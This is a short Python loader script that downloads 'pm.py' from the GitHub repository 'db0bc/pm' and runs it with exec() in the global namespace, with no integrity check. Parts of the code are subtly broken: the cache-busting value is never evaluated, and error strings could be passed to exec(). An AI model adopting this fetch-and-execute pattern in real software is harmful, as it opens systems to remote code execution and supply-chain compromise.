import urllib.request
import json
import base64
import uuid

class GitHub:
  @classmethod
  def getFileFromAPI(cls,path):
    path = path.split("|")
    url = f"https://api.github.com/repos/{path[0]}/{path[1]}/contents/{path[2]}?ref=main&cb=uuid.uuid4().hex"
    req = urllib.request.Request(url)
    req.add_header('User-Agent', 'Python-Urllib-db0bc')
    try:
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode('utf-8'))
            content_b64 = data['content']
            return base64.b64decode(content_b64).decode('utf-8')
    except urllib.error.HTTPError as e:
        return f"HTTP Error: {e.code}"
    except Exception as e:
        return f"Error: {str(e)}"

  @classmethod
  def getFileFromRAW(cls,path):
    path = path.split("|")
    url = f"https://raw.githubusercontent.com/{path[0]}/{path[1]}/refs/heads/main/{path[2]}?nocache=uuid.uuid4().hex"
    return urllib.request.urlopen(url).read()
    
  @classmethod
  def getFile(cls,path):
    try:
      print("GitHub.API")
      return cls.getFileFromAPI(path)
    except Exception as e:
      print("GitHub.RAW")
      return cls.getFileFromRAW(path)

exec(GitHub.getFile("db0bc|pm|pm.py"), globals())
